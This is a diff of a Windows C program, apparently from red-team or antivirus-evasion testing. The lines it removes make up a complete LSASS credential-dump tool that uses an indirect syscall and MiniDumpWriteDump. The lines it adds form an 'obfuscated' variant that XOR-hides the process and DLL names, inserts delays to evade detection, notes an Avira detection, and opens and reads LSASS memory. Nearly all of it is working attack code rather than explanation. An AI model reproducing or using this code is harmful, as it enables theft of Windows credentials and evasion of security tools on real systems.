@@ -1,55 +1,29 @@
 #include <windows.h>
-#include <processthreadsapi.h>
-#include <dbghelp.h>
+#include <stdio.h>
 #include <tlhelp32.h>
-#include <winternl.h>
-#include <iostream>
-#include <shlwapi.h>
-#include "syscalls.h"
-#pragma comment(lib, "dbghelp.lib")
-#pragma comment(lib, "shlwapi.lib")
+#include <string.h>
 
-// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
-// lpCmdLine, int nCmdShow) {
-//
+// Test 8: Version obfusquée du dump LSASS
+// Avec:
+// - Délais
+// - Strings XOR
+// - Appels spacing
 
-DWORD wNtOpenProcess;
-UINT_PTR sysAddrNtOpenProcess;
+// XOR simple
+void rox(char* d, size_t d_len, char* k, size_t k_len) {
+        int j;
 
-int FindTarget(const char* procname) {
-        HANDLE hProcSnap;
-        PROCESSENTRY32 pe32;
-        int pid = 0;
+        j = 0;
+        for (int i = 0; i < d_len; i++) {
+                if (j == k_len - 1)
+                        j = 0;
 
-        // Take a snapshot of all the processes currently running
-        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-
-        if (INVALID_HANDLE_VALUE == hProcSnap)
-                return 0;
-
-        // PROCESSENTRY32 is a struct that holds process info
-        // setting dwSize ensure the code works correctly on 32-bit and 64-bit envs
-        pe32.dwSize = sizeof(PROCESSENTRY32);
-
-        // Check if any processes are currently running
-        if (!Process32First(hProcSnap, &pe32)) {
-                CloseHandle(hProcSnap);
-                return 0;
+                d[i] = d[i] ^ k[j];
+                j++;
         }
-
-        while (Process32Next(hProcSnap, &pe32)) {
-                // lstrcmpiA ignore the capitalization of the process letters
-                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
-                        pid = pe32.th32ProcessID;
-                        break;
-                }
-        }
-
-        CloseHandle(hProcSnap);
-
-        return pid;
 }
 
+// Is flagged by Avira, maybe need to obfuscate this function
 BOOL setPrivilege(LPCTSTR privilegeName) {
         HANDLE hToken = NULL;
         if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
@@ -86,67 +60,97 @@ BOOL setPrivilege(LPCTSTR privilegeName) {
         CloseHandle(hToken);
         return TRUE;
 }
-
-int main(void) {
+int main() {
         if (!setPrivilege(SE_DEBUG_NAME)) {
-                printf("Cannot enable SeDebugPrivilege\n");
+                printf("[-] Cannot enable SeDebugPrivilege\n");
                 return 1;
         }
-        printf("SeDebugPrivilege enabled\n");
+        printf("[+] SeDebugPrivilege enabled\n");
+        printf("[*] Test 8: Obfuscated LSASS Memory Access\n");
 
-        const char* procname = "lsass.exe";
-        // const char* procname = "notepad.exe";
+        // Attendre au démarrage
+        Sleep(2000);
 
-        int pid = FindTarget(procname);
+        // String XOR: "lsass.exe" ^ 0x55
+        char lsassName[] = {0x39, 0x26, 0x34, 0x26, 0x26, 0x7b, 0x30, 0x2d, 0x30, 0x00};
 
-        printf("PID: %u\n", pid);
-
-        // Trying Indirect Syscall for OpenProcess
-        // Get the handle of NTDLL
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-
-        // Get the addr of the target function
-        UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hNtdll, "NtOpenProcess");
-
-        // Here we read the syscall number
-        // Usually located at the 4th byte of the function
-        wNtOpenProcess = ((unsigned char*)(pNtOpenProcess + 4))[0];
-
-        // Here we directly get the addr of the syscall stub (the actual syscall instruction)
-        // This is the diff between direct and indirect syscall
-        sysAddrNtOpenProcess = pNtOpenProcess + 0x12;
-
-        CLIENT_ID cid = {(HANDLE)(ULONG_PTR)pid, NULL};
-        OBJECT_ATTRIBUTES oa;
-        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
-
-        HANDLE hLsass = NULL;
-        NtOpenProcess(&hLsass, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, &oa, &cid);
-
-        if (!hLsass) {
-                printf("OpenProcess failed: %lu\n", GetLastError());
+        // Déchiffrer avec la clé
+        for (int i = 0; lsassName[i] != 0; i++) {
+                lsassName[i] ^= 0x55; // Cycle à travers la clé
         }
 
-        // Create a new file and get its handle
-        HANDLE hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
-                                   FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hFile == INVALID_HANDLE_VALUE) {
-                printf("CreateFile failed: %lu\n", GetLastError());
-                CloseHandle(hLsass);
+        printf("[+] Target: %s\n", lsassName);
+        Sleep(1000);
+
+        // Énumération processus
+        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        PROCESSENTRY32 pe = {};
+        pe.dwSize = sizeof(PROCESSENTRY32);
+
+        DWORD targetPID = 0;
+        if (Process32First(snapshot, &pe)) {
+                do {
+                        Sleep(100); // Délai pour éviter détection
+
+                        if (strcmp(pe.szExeFile, lsassName) == 0) {
+                                targetPID = pe.th32ProcessID;
+                                printf("[+] Found: PID %lu\n", targetPID);
+                                break;
+                        }
+                } while (Process32Next(snapshot, &pe));
+        }
+        CloseHandle(snapshot);
+
+        // Délai
+        Sleep(1000);
+
+        if (!targetPID) {
+                printf("[-] Not found\n");
+                return 1;
         }
 
-        printf("Trying to dump the process memory...\n");
-        BOOL dump = MiniDumpWriteDump((HANDLE)hLsass, (DWORD)pid, (HANDLE)hFile,
-                                      MiniDumpWithFullMemory, NULL, NULL, NULL);
-
-        if (!dump) {
-                printf("The dump failed: %lu\n", GetLastError());
-        } else {
-                printf("The dump succeeded !!!!\n");
+        // String XOR: "ntdll.dll" ^ 0x55
+        char dllName[] = {0x3b, 0x21, 0x31, 0x39, 0x39, 0x7b, 0x31, 0x39, 0x39, 0x00};
+        // Déchiffrer avec la clé
+        for (int i = 0; dllName[i] != 0; i++) {
+                dllName[i] ^= 0x55; // Cycle à travers la clé
         }
 
-        CloseHandle(hFile);
-        CloseHandle(hLsass);
+        printf("[+] Target: %s\n", dllName);
+        // Charger ntdll
+        HMODULE hDll = LoadLibraryA(dllName);
+        Sleep(500);
+
+        // Ouvrir avec permissions réduites d'abord
+        printf("[*] Opening with PROCESS_QUERY_INFORMATION...\n");
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
+        Sleep(500);
+
+        if (!hProcess) {
+                printf("[-] OpenProcess failed\n");
+                return 1;
+        }
+
+        printf("[+] Got handle\n");
+
+        // Délai
+        Sleep(2000);
+
+        // Lire une petite région
+        printf("[*] Reading memory...\n");
+        BYTE buffer[512] = {};
+        SIZE_T bytesRead = 0;
+
+        ReadProcessMemory(hProcess, (LPCVOID)0x400000, buffer, 512, &bytesRead);
+        Sleep(500);
+
+        printf("[+] Read %zu bytes\n", bytesRead);
+
+        // Délai final
+        Sleep(1000);
+
+        CloseHandle(hProcess);
+        printf("[+] Done\n");
 
         return 0;
 }
